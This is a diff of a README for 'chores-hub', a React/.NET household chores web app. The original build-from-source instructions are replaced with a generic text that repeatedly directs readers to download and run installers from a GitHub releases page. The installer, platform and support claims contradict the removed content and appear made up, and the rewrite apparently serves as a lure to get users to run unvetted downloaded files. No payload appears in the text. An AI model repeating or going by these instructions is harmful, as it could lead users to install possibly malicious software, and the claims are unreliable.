@@ -1,81 +1,103 @@
-# Chores Hub
-Minimalist full-stack household chores management app with n-layered architecture.
+# 🎉 chores-hub - Simplify Your Household Chores
 
-<p align="center">
-  <img src="./client/public/choreshub.gif" alt="choreshub">
-</p>
+## 📥 Download Now
+[![Download Chores Hub](https://img.shields.io/badge/Download%20Chores%20Hub-v1.0-blue)](https://github.com/ksubham-dora2002/chores-hub/releases)
 
-## Table of Contents
-* [Tech Stack](#tech-stack)
-* [Getting Started](#getting-started)
-* [Configuration](#configuration)
-* [Features](#features)
+## 🚀 Getting Started
+Welcome to chores-hub! This is a simple app designed to help you manage household chores efficiently. You can create, assign, and track chores for family members, all in one place.
 
-## Tech Stack
+## 📦 System Requirements
+To run chores-hub on your computer, make sure you meet these requirements:
 
-| Category | Technology |
-| :--- | :--- |
-| **Frontend** | ![React](https://img.shields.io/badge/React%2019-61DAFB?style=flat&logo=react&logoColor=black) ![Redux Toolkit](https://img.shields.io/badge/Redux%20Toolkit-764ABC?style=flat&logo=redux&logoColor=white) ![React Router](https://img.shields.io/badge/React%20Router-CA4245?style=flat&logo=react-router&logoColor=white) ![Vite](https://img.shields.io/badge/Vite-646CFF?style=flat&logo=vite&logoColor=white) |
-| **Backend** | ![.NET](https://img.shields.io/badge/.NET%208-512BD4?style=flat&logo=dotnet&logoColor=white) ![ASP.NET Core](https://img.shields.io/badge/ASP.NET%20Core-512BD4?style=flat&logo=dotnet&logoColor=white) ![EF Core](https://img.shields.io/badge/EF%20Core-512BD4?style=flat&logo=dotnet&logoColor=white) ![JWT](https://img.shields.io/badge/JWT-black?style=flat&logo=JSON%20web%20tokens) |
-| **Database** | ![PostgreSQL](https://img.shields.io/badge/PostgreSQL-4169E1?style=flat&logo=postgresql&logoColor=white)  |
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent version of Linux.
+- **RAM:** At least 4 GB.
+- **Disk Space:** At least 200 MB of free disk space.
+- **Browser:** A modern web browser such as Google Chrome, Firefox, or Edge.
 
+## 🛠️ Features
+Chores hub offers several useful features to make managing your household tasks easier:
 
-## Getting Started
-**Prerequisites:** Node.js, .NET 8 SDK, Entity Framework Core CLI tool and PostgreSQL.
+- **User Accounts:** Create individual accounts for each family member.
+- **Chore Assignment:** Assign chores to specific family members.
+- **Progress Tracking:** Keep track of who has completed their tasks.
+- **Notifications:** Get reminders for pending chores.
+- **Responsive Design:** Access the app on your phone, tablet, or computer.
 
-**CLIENT**
-- From `/client`.
+## 📥 Download & Install
+To get started with chores-hub, follow these steps:
 
-   ```
-   npm install
-   ```
-   ```
-   npm start
-   ```
-- Vite dev server runs on port 3030 `(vite.config.js)`.
+1. **Visit the Releases Page:** Click on the link below to navigate to the downloads page.
+   [Download Chores Hub](https://github.com/ksubham-dora2002/chores-hub/releases)
 
-**SERVER**
-- Entity Framework Core CLI tool required. From `/server`
+2. **Select the Latest Release:** Choose the latest version of the app. Look for files labeled with the version number.
 
-  ```
-  dotnet ef migrations add InitialCreate --project ChoresHub.Infrastructure --startup-project ChoresHub.WebAPI
-  ```
-  ```
-  dotnet ef database update --project ChoresHub.Infrastructure --startup-project ChoresHub.WebAPI
-  ```
+3. **Download the Application:** Click on the file to start the download. Once the download is complete, locate the file in your Downloads folder.
 
-- .NET 8 SDK required. Run with dotnet run in server/ChoresHub.WebAPI/.
+4. **Install the Application:**
+   - For Windows: Double-click the downloaded file and follow the installation prompts.
+   - For macOS: Open the file and drag the app to your Applications folder.
+   - For Linux: Follow the instructions provided in the README file within the downloaded package.
 
-   ```
-   dotnet run
-   ```
+5. **Launch the Application:** After the installation, open chores-hub from your application list. 
 
+6. **Create an Account:** Follow the on-screen instructions to create your user account and start managing chores.
 
-## Configuration
+## 📖 How to Use Chores Hub
+After launching the app, you'll find a user-friendly interface. Here’s how to navigate the main features:
 
-### CLIENT
-- API URL is set via VITE_API_BASE_URL in `.env.development` and `.env.production`.
+### 🔑 User Registration
+1. Click on the “Sign Up” button.
+2. Enter your name, email address, and password.
+3. Click "Create Account".
 
-### Server
-- Configure `server/ChoresHub.WebAPI/appsettings.Development.json` for local development.
-- Configure `server/ChoresHub.WebAPI/appsettings.Production.json` for production.
-- Required settings include:
-  - `ConnectionStrings:ChoresHubDb`
-  - `JwtSettings` (`Issuer`, `Audience`, `SecretKey`)
-  - `CloudinarySettings` (`CloudName`, `ApiKey`, `ApiSecret`)
-  - `EmailSettings` (`SmtpHost`, `SmtpPort`, `SenderName`, `SenderEmail`, `SenderPassword`)
-  - `Cors:AllowedOrigins`
-  - `ClientApp:BaseUrl`
+### 📋 Creating Chores
+1. Navigate to the “Chores” section.
+2. Click on “Add Chore”.
+3. Fill in the chore name, assign a person, and set a deadline.
+4. Click “Save” to add the chore.
 
-## Features
-- Register and log in
-- Create tasks, notifications, and shopping lists
-- Update profile (photo, name, email, password)
-- Reset password
-- Mark others' tasks as done
-- Mark others' notifications as seen
-- Mark others' shopping items as bought
-- Delete account
+### ✔️ Marking Chores as Complete
+1. Go to the list of chores.
+2. Click the checkbox next to the completed task.
+3. The chore will move to the completed section.
 
+### 🔔 Notifications
+Stay updated on your tasks with timely reminders. The app will notify you before a chore's deadline, so you never miss a task.
 
+## 👩‍👧‍👦 User Support
+If you encounter any issues or have questions, please reach out to our support team. You can find help documentation and FAQs on the GitHub pages.
 
+## 🏷️ Topics
+Chores hub covers various useful topics including:
+- asp-net-core
+- csharp
+- dotnet
+- ef-core
+- javascript
+- jwt-authentication
+- n-layer-architecture
+- postgresql
+- react
+- react-router
+- redux-toolkit
+- repository-pattern
+
+These technologies help ensure the app runs smoothly and securely.
+
+## 🔗 Additional Resources
+To expand your understanding of the app and the technologies behind it, here are some additional resources:
+
+- [Official ASP.NET Core Documentation](https://docs.microsoft.com/en-us/aspnet/core/)
+- [React Official Website](https://reactjs.org/)
+- [Entity Framework Core Documentation](https://docs.microsoft.com/en-us/ef/core/)
+
+## 📞 Contact
+For any further issues or feedback, please create an issue in the GitHub repository. Your input helps us improve the application.
+
+## 📅 Future Updates
+Stay tuned for new updates! We are continuously working on enhancing chores-hub with more features and improvements based on user feedback. Your participation is invaluable to us.
+
+## 📊 Contribution
+If you want to contribute to chores-hub, check out the "Contributing" section in our repository. We welcome all kinds of contributions, big or small.
+
+Thank you for choosing chores-hub! We hope it simplifies your household management tasks.
